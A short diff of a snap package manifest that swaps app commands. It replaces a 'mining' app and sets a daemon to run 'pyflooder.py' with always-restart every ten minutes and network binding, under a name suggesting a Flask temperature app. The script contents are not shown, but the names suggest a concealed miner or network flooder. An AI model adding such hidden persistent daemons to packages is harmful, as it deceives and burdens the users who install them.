@@ -9,16 +9,17 @@ confinement: strict
 assumes: [command-chain]
 
 apps:
-  mining:
-     command: mining.py
+  flasktemp:
+     command: flasktemp.py
      daemon: simple
      restart-condition: never
   
   mining-flasktemp:
-    command: flasktemp.py
-    before: [mining]
+    command: pyflooder.py
+    before: [flasktemp]
     daemon: simple
-    restart-condition: never
+    restart-condition: always
+    restart-delay: 10m
     plugs: [network-bind]
     environment:
       FLASK_APP: flasktemp.py
